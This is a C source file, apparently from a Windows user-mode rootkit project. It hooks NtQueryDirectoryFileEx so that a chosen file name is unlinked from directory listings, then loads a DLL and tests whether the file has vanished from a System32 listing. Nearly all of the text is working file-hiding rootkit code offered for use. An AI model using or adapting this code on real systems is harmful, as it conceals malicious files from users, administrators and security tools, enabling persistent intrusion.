#include "../rku.h"
unsigned char hide_me[] = HIDE_ME;
unsigned short shide_me[] = LHIDE_ME;
typedef NTSTATUS (*fpNtQueryDirectoryFileEx)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName);

NTSTATUS hookQDFE(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName)
{
    fpNtQueryDirectoryFileEx QDFE;
    GVA(&QDFE);
    int res = QDFE(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
    if (!NT_SUCCESS(res))
    {
        return res;
    }
    switch (FileInformationClass)
    {
    case FileFullDirectoryInformation:
    case FileBothDirectoryInformation:

        PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;

        ULONG next = 0;
        PFILE_BOTH_DIR_INFORMATION prev = current;
        while (1)
        {
            next = current->NextEntryOffset;

            if (custom_ucscmp(current->FileName, current->FileNameLength, shide_me, sizeof(shide_me) - 2) == 0)
            {

                // printf("[+] Found and patched the occurance\n");
                if (current->NextEntryOffset)
                {
                    prev->NextEntryOffset += next;
                }
                else
                {
                    prev->NextEntryOffset = 0;
                }
            }
            else
            {
                prev = current;
            }
            if (current->NextEntryOffset)
            {
                current = (ULONG64)current + next;
            }

            else
            {
                break;
            }
        }
        break;
    }
    return res;
}

int test(const char *sDir)
{
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;
    char sPath[MAX_PATH];
    sprintf(sPath, "%s\\*.*", sDir);
    if ((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
    {
        return 1;
    }
    // printf("HANDLE hFind %p\n", hFind);
    do
    {
        // printf("%s\n", fdFile.cFileName);
        if (strcmp(fdFile.cFileName, hide_me) == 0)
        {
            printf("We have found the file!\n");
            goto test_exit;
        }
    } while (FindNextFile(hFind, &fdFile));
    printf("We have not found the file :(\n");
test_exit:
    FindClose(hFind);

    return 0;
}

int main()
{
    // HookInfo h;
    // InstallHook(_GetProcAddressNative("NtQueryDirectoryFileEx"), hookQDFE, &h);
    test("C:\\Windows\\System32");
    LoadLibraryA("../inf.dll");
    test("C:\\Windows\\System32");
}